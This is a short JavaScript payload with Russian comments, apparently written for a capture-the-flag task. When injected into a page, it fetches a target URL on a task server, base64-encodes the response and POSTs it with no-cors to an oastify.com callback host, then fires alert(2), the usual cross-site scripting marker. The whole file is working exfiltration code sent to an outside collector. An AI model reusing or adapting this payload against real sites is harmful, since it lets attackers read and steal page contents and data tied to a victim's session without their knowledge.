function toBase64(str) {
    return btoa(unescape(encodeURIComponent(str)));
}

// URL для запроса и URL для отправки данных
const targetUrl = 'http://tasks.duckerz.ru:30057/';
const reportUrl = 'http://d7l0w0ue0ksbj7nimgj8t8t8qzwtkj88.oastify.com';

// Выполняем запрос к целевому URL
fetch(targetUrl)
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.text();
    })
    .then(data => {
        // Конвертируем данные в base64
        const base64Data = toBase64(data);
        
        // Отправляем данные на сервер oastify.com
        return fetch(reportUrl, {
            method: 'POST',
            mode: 'no-cors',
            body: base64Data
        });
    })
    .then(() => {
        console.log('Data successfully sent to oastify.com');
    })
    .catch(error => {
        console.error('Error:', error);
    });
alert(2)
